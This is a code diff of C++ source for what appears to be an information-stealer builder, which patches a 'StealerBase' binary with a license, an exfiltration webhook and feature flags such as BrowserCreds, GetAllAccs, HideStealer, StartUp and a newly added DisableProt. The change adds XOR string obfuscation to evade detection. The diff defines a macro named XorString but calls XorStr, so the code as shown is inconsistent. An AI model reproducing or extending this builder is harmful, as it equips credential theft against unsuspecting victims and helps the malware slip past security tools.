@@ -9,8 +9,10 @@
 #include <vector>
 #include <fstream>
 #include <sstream>
+#include "XorString.h"
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "urlmon.lib")
+#define XorString( String ) ( CXorString<ConstructIndexList<sizeof( String ) - 1>::Result>( String ).decrypt() )
 
 using namespace std;
 
@@ -86,22 +88,22 @@ int main(int argc, char* argv[])
 			ifstream MyFile(StealerBase, std::ios::binary);
 			string AllBytes = string((istreambuf_iterator<char>(MyFile)),
 				(istreambuf_iterator<char>()));
-			string DummyLicense = "[zbuilder{zbuilder}]";
+			string DummyLicense = XorStr("[zbuilder{zbuilder}]");
 			size_t DummyLicenseLocation = AllBytes.find(DummyLicense);
 			AllBytes.replace(DummyLicenseLocation, DummyLicense.length(), decrypt(License));
-			string DummyText = "[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]";
-			string DummyText2 = "<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>";
+			string DummyText = XorStr("[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]");
+			string DummyText2 = XorStr("<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>");
 			size_t DummyTextLocation = AllBytes.find(DummyText);
 			size_t DummyText2Location = AllBytes.find(DummyText2);
 			AllBytes.replace(DummyTextLocation, WebHook.length(), WebHook);
 			AllBytes.replace(DummyText2Location, WebHook.length(), WebHook);
 			string RawLocation = CMDParts[2];
 			string AAPData = CMDParts[3];
-			string DummyAAP = "{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}";
+			string DummyAAP = XorStr("{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}");
 			size_t DummyAAPLocation = AllBytes.find(DummyAAP);
 			AllBytes.replace(DummyAAPLocation, AAPData.length(), AAPData);
 			string Features = CMDParts[4];
-			string DummyFeatures = "[Tracer:(N)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]--[BrowserCreds:(N)]";
+			string DummyFeatures = XorStr("[DisableProt:(N)]--[Tracer:(N)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]--[BrowserCreds:(N)]");
 			size_t DummyFeaturesLocation = AllBytes.find(DummyFeatures);
 			AllBytes.replace(DummyFeaturesLocation, DummyFeatures.length(), Features);
 			string Location = RawLocation.substr(1, RawLocation.size() - 2);
